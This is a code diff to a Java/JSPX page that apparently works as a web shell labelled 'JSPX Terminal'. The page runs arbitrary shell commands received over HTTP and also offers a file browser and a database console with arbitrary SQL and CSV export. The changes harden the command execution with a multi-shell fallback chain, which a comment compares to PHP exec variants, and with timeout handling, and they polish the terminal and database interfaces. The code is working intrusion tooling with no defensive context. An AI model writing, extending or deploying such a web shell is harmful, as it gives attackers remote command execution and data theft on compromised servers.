@@ -31,6 +31,8 @@ private String toJson(Map<String, Object> map) {
             sb.append(value);
         } else if (value instanceof List) {
             sb.append(toJsonArray((List)value));
+        } else if (value instanceof Map) {
+            sb.append(toJson((Map<String, Object>) value));
         } else {
             sb.append("\"").append(escapeJsonString(value.toString())).append("\"");
         }
@@ -223,7 +225,9 @@ private List<Map<String, Object>> getFileList(String dirPath) {
 private Map<String, Object> executeCommand(String cmd, String cwd) {
     Map<String, Object> result = new HashMap<>();
     File workDir = (cwd != null && !cwd.isEmpty()) ? new File(cwd) : new File(System.getProperty("user.dir"));
+    if (!workDir.exists()) workDir = new File(System.getProperty("user.dir"));
     String newCwd = workDir.getAbsolutePath();
+
     try {
         String trimmed = cmd.trim();
         if (trimmed.equals("cd") || trimmed.equals("cd ~")) {
@@ -232,6 +236,9 @@ private Map<String, Object> executeCommand(String cmd, String cwd) {
                 newCwd = home.getCanonicalPath();
                 result.put("output", "Changed directory to: " + newCwd);
                 result.put("exit_code", 0);
+            } else {
+                result.put("output", "Home directory not found");
+                result.put("exit_code", 1);
             }
         } else if (trimmed.startsWith("cd ")) {
             String targetDir = trimmed.substring(3).trim();
@@ -245,45 +252,73 @@ private Map<String, Object> executeCommand(String cmd, String cwd) {
                 result.put("exit_code", 1);
             }
         } else {
-            ProcessBuilder pb = new ProcessBuilder();
-            if (System.getProperty("os.name").toLowerCase().contains("win")) {
-                pb.command("cmd.exe", "/c", cmd);
+            // Fallback chain similar to PHP exec variants: try the most capable shell first.
+            List<List<String>> attempts = new ArrayList<>();
+            boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
+            if (isWin) {
+                attempts.add(Arrays.asList("cmd.exe", "/c", cmd));
             } else {
-                pb.command("sh", "-c", cmd);
+                if (new File("/bin/bash").exists()) attempts.add(Arrays.asList("/bin/bash", "-lc", cmd));
+                attempts.add(Arrays.asList("/bin/sh", "-c", cmd));
+                attempts.add(Arrays.asList("sh", "-c", cmd));
             }
-            pb.directory(workDir);
-            pb.redirectErrorStream(true);
-            Process process = pb.start();
-            
-            // Read output with timeout safety
-            final Process p = process;
-            java.util.concurrent.Future<String> future = java.util.concurrent.Executors.newSingleThreadExecutor().submit(() -> {
-                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                StringBuilder output = new StringBuilder();
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    output.append(line).append("\n");
+
+            Map<String, Object> procResult = null;
+            Exception lastErr = null;
+            for (List<String> attempt : attempts) {
+                try {
+                    procResult = runProcess(attempt, workDir, 10000);
+                    break; // success
+                } catch (Exception ex) {
+                    lastErr = ex;
                 }
-                return output.toString();
-            });
-            
-            try {
-                String out = future.get(10, java.util.concurrent.TimeUnit.SECONDS);
-                result.put("output", out);
-                if (process.isAlive()) process.destroy();
-                result.put("exit_code", process.isAlive() ? -1 : process.exitValue());
-            } catch (java.util.concurrent.TimeoutException e) {
-                process.destroy();
-                result.put("output", "Error: Command timed out");
+            }
+
+            if (procResult != null) {
+                result.putAll(procResult);
+            } else {
+                result.put("output", "Execution Error: " + (lastErr != null ? lastErr.getMessage() : "Unknown"));
                 result.put("exit_code", -1);
             }
         }
     } catch (Exception e) {
-        result.put("output", "Error: " + e.getMessage());
+        result.put("output", "Execution Error: " + e.toString());
         result.put("exit_code", -1);
     }
     result.put("cwd", newCwd);
     return result;
+}
+
+private Map<String, Object> runProcess(List<String> command, File workDir, long timeoutMs) throws Exception {
+    Map<String, Object> res = new HashMap<>();
+    ProcessBuilder pb = new ProcessBuilder(command);
+    pb.directory(workDir);
+    pb.redirectErrorStream(true);
+    Process process = pb.start();
+
+    StringBuilder output = new StringBuilder();
+    Thread reader = new Thread(() -> {
+        byte[] buf = new byte[1024];
+        int n;
+        try (InputStream is = process.getInputStream()) {
+            while ((n = is.read(buf)) != -1) {
+                output.append(new String(buf, 0, n));
+            }
+        } catch (IOException ignored) {}
+    });
+    reader.start();
+
+    boolean finished = process.waitFor(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS);
+    if (!finished) {
+        process.destroyForcibly();
+        output.append("\n[Timed out]");
+        res.put("exit_code", -1);
+    } else {
+        reader.join(1000);
+        res.put("exit_code", process.exitValue());
+    }
+    res.put("output", output.toString());
+    return res;
 }
 
 private Connection getDbConnection(HttpSession session) throws Exception {
@@ -647,28 +682,48 @@ private void handleDbExportCsv(HttpServletRequest request, HttpServletResponse r
     String csvQuery = request.getParameter("query");
     Map<String, Object> csvData = executeDbQuery(session, csvQuery);
     
+    String dbName = (String) session.getAttribute("db_name");
+    String filename = (dbName != null ? dbName : "export");
+    
+    // Try to extract table name from query for filename
+    String q = csvQuery.replaceAll("\\s+", " ").trim().toLowerCase();
+    if (q.startsWith("select") && q.contains(" from ")) {
+        String[] parts = q.split(" from ");
+        if (parts.length > 1) {
+            String tablePart = parts[1].trim().split(" ")[0];
+            tablePart = tablePart.replaceAll("[^a-zA-Z0-9_]", "");
+            if (!tablePart.isEmpty()) {
+                filename += "_" + tablePart;
+            }
+        }
+    }
+    filename += ".csv";
+    
     response.setContentType("text/csv; charset=utf-8");
-    response.setHeader("Content-Disposition", "attachment; filename=export_" + 
-        new SimpleDateFormat("yyyy-MM-dd_HHmmss").format(new java.util.Date()) + ".csv");
+    response.setHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");
     
     List<String> cols = (List<String>) csvData.get("columns");
     List<Map<String, Object>> csvRows = (List<Map<String, Object>>) csvData.get("rows");
     
-    // Write header
-    for (int i = 0; i < cols.size(); i++) {
-        if (i > 0) out.print(",");
-        out.print(escapeCsv(cols.get(i)));
-    }
-    out.println();
-    
-    // Write rows
-    for (Map<String, Object> row : csvRows) {
+    if (cols != null) {
+        // Write header
         for (int i = 0; i < cols.size(); i++) {
             if (i > 0) out.print(",");
-            Object val = row.get(cols.get(i));
-            out.print(val != null ? escapeCsv(val.toString()) : "");
+            out.print(escapeCsv(cols.get(i)));
         }
         out.println();
+        
+        // Write rows
+        if (csvRows != null) {
+            for (Map<String, Object> row : csvRows) {
+                for (int i = 0; i < cols.size(); i++) {
+                    if (i > 0) out.print(",");
+                    Object val = row.get(cols.get(i));
+                    out.print(val != null ? escapeCsv(val.toString()) : "");
+                }
+                out.println();
+            }
+        }
     }
     out.flush();
 }
@@ -783,9 +838,10 @@ private String renderFilesContent() {
 
 private String renderTerminalContent(String cwd) {
     StringBuilder sb = new StringBuilder();
-    sb.append("<div class=\"card\">");
+    sb.append("<div class=\"card terminal-card\">");
     sb.append("<div class=\"card-header\"><span class=\"card-icon\">💻</span><h3>Terminal</h3></div>");
     sb.append("<div class=\"terminal-container\">");
+    sb.append("<div class=\"terminal-status\">CWD: <span id=\"terminalCwdDisplay\">").append(escapeHtml(cwd)).append("</span></div>");
     sb.append("<div id=\"terminalOutput\" class=\"terminal-output\">Welcome to JSPX Terminal\n");
     sb.append("Current directory: ").append(escapeHtml(cwd)).append("\n\n</div>");
     sb.append("<div class=\"terminal-input\">");
@@ -815,20 +871,28 @@ private String renderDatabaseContent(HttpSession session) {
         sb.append("</div>");
         sb.append("<button class=\"btn btn-primary\" onclick=\"dbConnect()\">🔗 Connect</button>");
     } else {
-        sb.append("<div style=\"margin-bottom:1rem;\">");
+        sb.append("<div style=\"margin-bottom:1rem; display:flex; gap:1rem; align-items:center; flex-wrap:wrap;\">");
         sb.append("<span style=\"color:#28a745;font-weight:600\">✅ Connected to ").append(escapeHtml(driver)).append("</span> ");
-        sb.append("<button class=\"btn btn-sm btn-danger\" onclick=\"dbDisconnect()\" style=\"margin-left:1rem\">Disconnect</button>");
-        sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"loadDbTables()\" style=\"margin-left:0.5rem\">📋 Show Tables</button>");
-        sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"showDatabases()\" style=\"margin-left:0.5rem\">🗄️ Show DBs</button>");
+        sb.append("<button class=\"btn btn-sm btn-danger\" onclick=\"dbDisconnect()\">Disconnect</button>");
+        sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"loadDbTables()\">📋 Refresh Tables</button>");
+        sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"showDatabases()\">🗄️ Refresh DBs</button>");
         sb.append("</div>");
+
+        sb.append("<div class=\"db-layout\">");
+        sb.append("<div class=\"db-sidebar\">");
+        sb.append("<div class=\"db-side-card\"><h4>Databases</h4><div id=\"dbDatabases\" class=\"db-list\"><p class=\"text-muted\">Click refresh DBs</p></div></div>");
+        sb.append("<div class=\"db-side-card\" style=\"margin-top:1rem\"><h4>Tables</h4><div id=\"dbTables\" class=\"db-list\"><p class=\"text-muted\">Click refresh tables</p></div></div>");
+        sb.append("</div>");
+        sb.append("<div class=\"db-main\">");
         sb.append("<div class=\"db-query\">");
         sb.append("<textarea id=\"dbQueryText\" placeholder=\"Enter SQL query...\"></textarea>");
-        sb.append("<div style=\"display:flex;gap:0.5rem;margin-top:0.5rem\">");
+        sb.append("<div style=\"display:flex;gap:0.5rem;margin-top:0.5rem;flex-wrap:wrap;\">");
         sb.append("<button class=\"btn btn-primary\" onclick=\"executeDbQuery()\">▶️ Execute Query</button>");
         sb.append("<button class=\"btn btn-secondary\" onclick=\"exportCsv()\">📥 Export CSV</button>");
         sb.append("</div></div>");
         sb.append("<div id=\"dbResults\" class=\"db-table\"></div>");
-        sb.append("<div id=\"dbTables\" style=\"margin-top:1rem\"></div>");
+        sb.append("</div>");
+        sb.append("</div>");
     }
     sb.append("</div>");
     return sb.toString();
@@ -997,8 +1061,19 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-
 .db-table table { width: 100%; border-collapse: collapse; font-size: 0.875rem; }
 .db-table th, .db-table td { padding: 0.5rem; border: 1px solid #e0e0e0; text-align: left; }
 .db-table th { background: #f8f9fa; font-weight: 600; }
-.terminal-container { background: #1e1e1e; color: #d4d4d4; border-radius: 6px; overflow: hidden; }
-.terminal-output { font-family: 'Consolas', 'Monaco', monospace; font-size: 0.875rem; padding: 1rem; min-height: 400px; max-height: 600px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+.db-layout { display: flex; gap: 1.5rem; align-items: flex-start; flex-wrap: wrap; }
+.db-sidebar { width: 260px; min-width: 240px; }
+.db-side-card { background: #f8f9fb; border: 1px solid #e6e8ed; border-radius: 6px; padding: 0.75rem 0.75rem 0.25rem 0.75rem; }
+.db-side-card h4 { margin: 0 0 0.5rem 0; color: #1e3a8a; font-size: 1rem; }
+.db-list { max-height: 400px; overflow-y: auto; padding-bottom: 0.5rem; }
+.db-list ul { list-style: none; padding-left: 0; }
+.db-list li { padding: 0.35rem 0.25rem; border-bottom: 1px solid #e6e8ed; cursor: pointer; color: #2563eb; font-weight: 500; }
+.db-list li:hover { background: #eef2ff; }
+.db-main { flex: 1; min-width: 300px; }
+.terminal-card { max-width: none; width: 100%; }
+.terminal-container { background: #1e1e1e; color: #d4d4d4; border-radius: 6px; overflow: hidden; width: 100%; margin: 0 0 1.5rem 0; box-shadow: 0 4px 10px rgba(0,0,0,0.25); }
+.terminal-status { background: #111; padding: 0.65rem 1rem; border-bottom: 1px solid #333; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.85rem; }
+.terminal-output { font-family: 'Consolas', 'Monaco', monospace; font-size: 0.875rem; padding: 1rem; height: 480px; overflow-y: auto; white-space: pre-wrap; word-break: break-word; }
 .terminal-input { display: flex; gap: 0.5rem; padding: 1rem; background: #252526; border-top: 1px solid #3e3e3e; }
 .terminal-input input { flex: 1; background: #3c3c3c; color: #d4d4d4; border: 1px solid #555; padding: 0.5rem; border-radius: 4px; font-family: 'Consolas', 'Monaco', monospace; }
 .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center; }
@@ -1360,6 +1435,7 @@ function initTerminal() {
             }
         });
     }
+    updateTerminalCwdDisplay();
 }
 
 function executeCmd() {
@@ -1380,17 +1456,20 @@ function executeCmd() {
             addToTerminal(data.data.output || '');
             if (data.data.cwd) {
                 terminalCwd = data.data.cwd;
+                updateTerminalCwdDisplay();
             }
         } else {
             addToTerminal('Error: ' + data.message);
         }
+    }).catch(function(err) {
+        addToTerminal('Request Failed: ' + err);
     });
 }
 
 function addToTerminal(text) {
     var output = document.getElementById('terminalOutput');
     if (output) {
-        output.textContent += text + '\n';
+        output.textContent += (text || '') + '\n';
         output.scrollTop = output.scrollHeight;
     }
 }
@@ -1400,6 +1479,16 @@ function clearTerminal() {
     if (output) {
         output.textContent = 'Welcome to JSPX Terminal\nCurrent directory: ' + terminalCwd + '\n\n';
     }
+}
+
+// Update CWD display immediately on page load
+window.addEventListener('DOMContentLoaded', function() {
+    updateTerminalCwdDisplay();
+});
+
+function updateTerminalCwdDisplay() {
+    var el = document.getElementById('terminalCwdDisplay');
+    if (el) el.textContent = terminalCwd;
 }
 
 function initDatabase() {
@@ -1436,17 +1525,19 @@ function loadDbTables() {
         .then(function(r) { return r.json(); })
         .then(function(data) {
             if (data.status === 'success') {
-                var html = '<div style="margin-top:1rem"><h4>Tables:</h4><ul>';
-                if (data.tables && data.tables.length > 0) {
-                    data.tables.forEach(function(table) {
-                        html += '<li style="cursor:pointer;color:#3b82f6" onclick="loadTableData(\'' + escapeJsStr(table) + '\')">' + escapeHtml(table) + '</li>';
-                    });
-                } else {
-                    html += '<li>No tables found</li>';
-                }
-                html += '</ul></div>';
                 var container = document.getElementById('dbTables');
-                if (container) container.innerHTML = html;
+                if (container) {
+                    var html = '<ul>';
+                    if (data.tables && data.tables.length > 0) {
+                        data.tables.forEach(function(table) {
+                            html += '<li onclick="loadTableData(\'' + escapeJsStr(table) + '\')">' + escapeHtml(table) + '</li>';
+                        });
+                    } else {
+                        html += '<li class="text-muted">No tables found</li>';
+                    }
+                    html += '</ul>';
+                    container.innerHTML = html;
+                }
                 toast('Tables loaded', 'success');
             } else {
                 toast(data.message, 'error');
@@ -1460,37 +1551,77 @@ function loadTableData(table) {
 }
 
 function showDatabases() {
-    document.getElementById('dbQueryText').value = 'SHOW DATABASES';
-    executeDbQuery();
+    postApi('db_query', { query: 'SHOW DATABASES' })
+        .then(function(data) {
+            var dbList = document.getElementById('dbDatabases');
+            if (data.status === 'success') {
+                if (dbList) {
+                    var html = '<ul>';
+                    var rows = (data.data && data.data.rows) ? data.data.rows : [];
+                    if (rows.length) {
+                        rows.forEach(function(row) {
+                            var name = row[Object.keys(row)[0]]; // first column value
+                            html += '<li onclick="selectDatabase(\'' + escapeJsStr(name) + '\')">' + escapeHtml(name) + '</li>';
+                        });
+                    } else {
+                        html += '<li class="text-muted">No databases found</li>';
+                    }
+                    html += '</ul>';
+                    dbList.innerHTML = html;
+                }
+                // Also render results in the main pane
+                if (data.data) renderDbResults(data.data);
+                toast('Databases loaded', 'success');
+            } else {
+                if (dbList) dbList.innerHTML = '<p class="text-danger">' + escapeHtml(data.message) + '</p>';
+                toast(data.message, 'error');
+            }
+        })
+        .catch(function(err) {
+            toast('Request failed: ' + err, 'error');
+        });
+}
+
+function selectDatabase(dbName) {
+    if (!dbName) return;
+    document.getElementById('dbQueryText').value = 'USE ' + dbName + ';';
+    toast('Selected database ' + dbName, 'success');
 }
 
 function executeDbQuery() {
     var query = document.getElementById('dbQueryText').value.trim();
     if (!query) { toast('Enter a query', 'error'); return; }
+    
+    var resultsContainer = document.getElementById('dbResults');
+    if (resultsContainer) resultsContainer.innerHTML = '<p class="text-muted">Executing...</p>';
+
     postApi('db_query', {
         query: query
     }).then(function(data) {
-        console.log('DB Response:', data); // Debugging
+        console.log('DB Response:', data);
         if (data.status === 'success') {
-            if (data.data && data.data.columns && data.data.columns.length > 0) {
-                renderDbResults(data.data);
-                toast('Query executed', 'success');
-            } else if (data.data && data.data.affected !== undefined) {
-                document.getElementById('dbResults').innerHTML = '<p>Query executed. Rows affected: ' + data.data.affected + '</p>';
-                toast('Query executed', 'success');
-            } else if (data.affected !== undefined) {
-                document.getElementById('dbResults').innerHTML = '<p>Query executed. Rows affected: ' + data.affected + '</p>';
-                toast('Query executed', 'success');
+            if (data.data) {
+                if (data.data.columns && data.data.columns.length > 0) {
+                    renderDbResults(data.data);
+                    toast('Query executed', 'success');
+                } else if (data.data.affected !== undefined) {
+                    if (resultsContainer) resultsContainer.innerHTML = '<p>Query executed. Rows affected: ' + data.data.affected + '</p>';
+                    toast('Query executed', 'success');
+                } else {
+                    if (resultsContainer) resultsContainer.innerHTML = '<p class="text-muted">No data returned (Empty Result)</p>';
+                    toast('Query executed', 'success');
+                }
             } else {
-                document.getElementById('dbResults').innerHTML = '<p class="text-muted">No data returned</p>';
-                toast('Query executed (No results)', 'success');
+                if (resultsContainer) resultsContainer.innerHTML = '<p class="text-muted">No data payload in response</p>';
             }
         } else {
+            if (resultsContainer) resultsContainer.innerHTML = '<p class="text-danger">Error: ' + escapeHtml(data.message) + '</p>';
             toast(data.message, 'error');
         }
     }).catch(function(e) {
         console.error(e);
-        toast('Request failed: ' + e.message, 'error');
+        if (resultsContainer) resultsContainer.innerHTML = '<p class="text-danger">Request failed: ' + escapeHtml(e.message || e) + '</p>';
+        toast('Request failed', 'error');
     });
 }
 
@@ -1498,33 +1629,42 @@ function renderDbResults(data) {
     var container = document.getElementById('dbResults');
     if (!container) return;
 
-    if (!data || !data.columns) {
-        container.innerHTML = '<p class="text-muted">No data returned</p>';
+    if (!data || !data.columns || !Array.isArray(data.columns)) {
+        container.innerHTML = '<p class="text-muted">Invalid data format: Missing columns</p>';
         return;
     }
-    var html = '<table><thead><tr>';
-    data.columns.forEach(function(col) {
-        html += '<th>' + escapeHtml(col) + '</th>';
-    });
-    html += '</tr></thead><tbody>';
-    data.rows.forEach(function(row) {
-        html += '<tr>';
-        data.columns.forEach(function(col) {
-            var val = row[col];
-            if (val === undefined) {
-                // Try to find key case-insensitively or exact match
-                // Since we can't iterate keys easily here without performance hit, 
-                // we rely on exact match. If undefined, check if row has the key.
-                // But row is an object.
-                val = 'NULL'; 
-                if (row[col] !== undefined) val = row[col];
+    
+    var html = '<div style="overflow-x:auto; border:1px solid #eee; border-radius:4px; margin-top:1rem;">';
+    html += '<table style="width:100%; border-collapse:collapse; min-width:100%; font-size:0.9rem;">';
+    
+    // Header
+    html += '<thead style="background:#f8f9fa; border-bottom:2px solid #dee2e6;"><tr>';
+    for (var i = 0; i < data.columns.length; i++) {
+        html += '<th style="padding:12px; text-align:left; font-weight:600; border:1px solid #dee2e6; color:#495057;">' + escapeHtml(data.columns[i]) + '</th>';
+    }
+    html += '</tr></thead>';
+    
+    // Body
+    html += '<tbody>';
+    var rows = data.rows || [];
+    if (rows.length === 0) {
+        html += '<tr><td colspan="' + data.columns.length + '" style="padding:12px; text-align:center; color:#6c757d;">No rows found</td></tr>';
+    } else {
+        for (var r = 0; r < rows.length; r++) {
+            var row = rows[r];
+            html += '<tr style="border-bottom:1px solid #dee2e6;">';
+            for (var c = 0; c < data.columns.length; c++) {
+                var colName = data.columns[c];
+                var val = row[colName];
+                if (val === null || val === undefined) val = '';
+                html += '<td style="padding:8px; border:1px solid #dee2e6; white-space:nowrap; color:#212529;">' + escapeHtml(val) + '</td>';
             }
-            html += '<td>' + (val != null ? escapeHtml(val) : 'NULL') + '</td>';
-        });
-        html += '</tr>';
-    });
-    html += '</tbody></table>';
-    html += '<p class="text-muted" style="margin-top:1rem;">' + data.rows.length + ' rows returned</p>';
+            html += '</tr>';
+        }
+    }
+    html += '</tbody></table></div>';
+    html += '<div style="margin-top:10px; color:#6c757d; font-size:0.85rem;">Total rows: ' + rows.length + '</div>';
+    
     container.innerHTML = html;
 }
 
